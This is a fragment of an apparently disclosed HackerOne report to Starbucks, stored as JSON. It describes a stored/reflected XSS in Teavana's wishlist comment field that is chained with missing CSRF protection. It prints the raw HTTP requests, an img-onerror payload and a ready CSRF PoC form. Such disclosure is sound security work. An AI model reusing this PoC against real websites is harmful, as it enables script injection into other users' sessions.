+    "vulnerability_information_html": "<p>User can add comments on their wishlist item. The http request which adds comment on wishlist item, looks like:</p>\n<pre class=\"highlight http\"><code><span class=\"nf\">POST</span> <span class=\"nn\">/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id</span> <span class=\"k\">HTTP</span><span class=\"o\">/</span><span class=\"m\">1.1</span>\n<span class=\"na\">Host</span><span class=\"p\">:</span> <span class=\"s\">www.teavana.com</span>\n<span class=\"na\">User-Agent</span><span class=\"p\">:</span> <span class=\"s\">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0</span>\n<span class=\"na\">Accept</span><span class=\"p\">:</span> <span class=\"s\">text/html, */*; q=0.01</span>\n<span class=\"na\">Accept-Language</span><span class=\"p\">:</span> <span class=\"s\">en-US,en;q=0.5</span>\n<span class=\"na\">Accept-Encoding</span><span class=\"p\">:</span> <span class=\"s\">gzip, deflate, br</span>\n<span class=\"na\">Content-Type</span><span class=\"p\">:</span> <span class=\"s\">application/x-www-form-urlencoded; charset=UTF-8</span>\n<span class=\"na\">X-Requested-With</span><span class=\"p\">:</span> <span class=\"s\">XMLHttpRequest</span>\n<span class=\"na\">Referer</span><span class=\"p\">:</span> <span class=\"s\">https://www.teavana.com/us/en/my-wishlist</span>\n<span class=\"na\">Content-Length</span><span class=\"p\">:</span> <span class=\"s\">55</span>\n<span class=\"na\">Cookie</span><span class=\"p\">:</span> <span class=\"s\">REDACTED</span>\n<span class=\"na\">Connection</span><span class=\"p\">:</span> <span class=\"s\">close</span>\n\nwishlistComment=:comment_string\n</code></pre>\n<p>The value of the <code>wishlistComment</code> reflects on the returned HTML snippet as bellow:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;textarea</span> <span class=\"na\">maxlength=</span><span class=\"s\">&quot;150&quot;</span> <span class=\"na\">onkeyup=</span><span class=\"s\">&quot;return ismaxlength(this);&quot;</span> <span class=\"na\">id=</span><span class=\"s\">&quot;wishlistComment&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;wishlistComment&quot;</span> <span class=\"na\">cols=</span><span class=\"s\">&quot;60&quot;</span> <span class=\"na\">rows=</span><span class=\"s\">&quot;12&quot;</span><span class=\"nt\">&gt;</span>\n:comment_string\n<span class=\"nt\">&lt;/textarea&gt;</span>\n</code></pre>\n<p>But the returned string is not sanitized. As a result if user submits html/javascript payload as the value, that payload will return and will cause javascript execution.</p>\n\n<p><strong>vulnerable post</strong></p>\n<pre class=\"highlight http\"><code><span class=\"nf\">POST</span> <span class=\"nn\">/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id</span> <span class=\"k\">HTTP</span><span class=\"o\">/</span><span class=\"m\">1.1</span>\n<span class=\"na\">Host</span><span class=\"p\">:</span> <span class=\"s\">www.teavana.com</span>\n<span class=\"na\">User-Agent</span><span class=\"p\">:</span> <span class=\"s\">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0</span>\n<span class=\"na\">Accept</span><span class=\"p\">:</span> <span class=\"s\">text/html, */*; q=0.01</span>\n<span class=\"na\">Accept-Language</span><span class=\"p\">:</span> <span class=\"s\">en-US,en;q=0.5</span>\n<span class=\"na\">Accept-Encoding</span><span class=\"p\">:</span> <span class=\"s\">gzip, deflate, br</span>\n<span class=\"na\">Content-Type</span><span class=\"p\">:</span> <span class=\"s\">application/x-www-form-urlencoded; charset=UTF-8</span>\n<span class=\"na\">X-Requested-With</span><span class=\"p\">:</span> <span class=\"s\">XMLHttpRequest</span>\n<span class=\"na\">Referer</span><span class=\"p\">:</span> <span class=\"s\">https://www.teavana.com/us/en/my-wishlist</span>\n<span class=\"na\">Content-Length</span><span class=\"p\">:</span> <span class=\"s\">55</span>\n<span class=\"na\">Cookie</span><span class=\"p\">:</span> <span class=\"s\">REDACTED</span>\n<span class=\"na\">Connection</span><span class=\"p\">:</span> <span class=\"s\">close</span>\n\nwishlistComment=&lt;/textarea&gt;&lt;img+src=x+onerror=alert(1)&gt;\n</code></pre>\n<p><strong>Response</strong></p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;textarea</span> <span class=\"na\">maxlength=</span><span class=\"s\">&quot;150&quot;</span> <span class=\"na\">onkeyup=</span><span class=\"s\">&quot;return ismaxlength(this);&quot;</span> <span class=\"na\">id=</span><span class=\"s\">&quot;wishlistComment&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;wishlistComment&quot;</span> <span class=\"na\">cols=</span><span class=\"s\">&quot;60&quot;</span> <span class=\"na\">rows=</span><span class=\"s\">&quot;12&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/textarea&gt;&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">x</span> <span class=\"na\">onerror=</span><span class=\"s\">alert(1)</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/textarea&gt;</span>\n</code></pre>\n<p>There is no csrf token tied with the comment adding post request. As a result this csrf flaw can make the self-xss as a global reflected xss.</p>\n\n<p><strong>CSRF to XSS PoC</strong></p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n  <span class=\"nt\">&lt;body&gt;</span>\n    <span class=\"nt\">&lt;form</span> <span class=\"na\">action=</span><span class=\"s\">&quot;https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id&quot;</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span><span class=\"nt\">&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;wishlistComment&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;&amp;lt;&amp;#47;textarea&amp;gt;&amp;lt;img&amp;#32;src&amp;#61;x&amp;#32;onerror&amp;#61;alert&amp;#40;1&amp;#41;&amp;gt;&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;submit&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;Submit request&quot;</span> <span class=\"nt\">/&gt;</span>\n    <span class=\"nt\">&lt;/form&gt;</span>\n  <span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>Replace the <code>:id</code> with your wishlist id (ex: C1005285074). This will execute the javascript and will popup an alert box.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"xssed.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/129/593/16ee0d3eb0e307e56f9ac3c91db6a3fe210261f1/xssed.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224336Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=b0f8173ba6df1a2244185103c54ba0585a889d8ed9256848457993ad1f4fde19\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/129/593/16ee0d3eb0e307e56f9ac3c91db6a3fe210261f1/xssed.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T224336Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=b0f8173ba6df1a2244185103c54ba0585a889d8ed9256848457993ad1f4fde19\" class=\"markdown-inline-image\"></a></p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://www.starbucks.com", 
+            "about": "Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time.", 
+            "twitter_handle": "Starbucks", 
+            "name": "Starbucks"
+        }, 
+        "handle": "starbucks", 
+        "url": "https://hackerone.com/starbucks", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/001/989/eeb88a587d959eb797ceed8669b245ec9ef20b81_small.?1432930626", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/001/989/48053f0ef688949bbb28248c5fc6ebb4f389820d_medium.?1432930626"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 1989, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
